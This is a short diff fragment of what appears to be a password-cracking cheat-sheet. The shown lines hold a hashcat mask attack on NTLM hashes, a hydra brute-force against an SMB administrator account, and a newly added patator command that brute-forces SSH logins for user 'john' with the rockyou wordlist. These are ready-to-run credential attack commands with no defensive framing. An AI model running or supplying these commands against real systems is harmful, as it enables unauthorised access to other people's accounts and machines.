@@ -37,6 +37,8 @@ hashcat --force --hwmon-temp-abort=100 -m 1000 -D 1,2 -a 3 -i --increment-min 5 
  b | 0x00 - 0xff
 
 
+patator ssh_login host=10.8.0.14 user=john password=FILE0 0=/usr/share/wordlists/rockyou.txt -x ignore:mesg=’Authentication failed.’
+
 
 hydra -P wifite.txt -l administrator smb://192.168.50.200 -m "ROOT.DC"
 
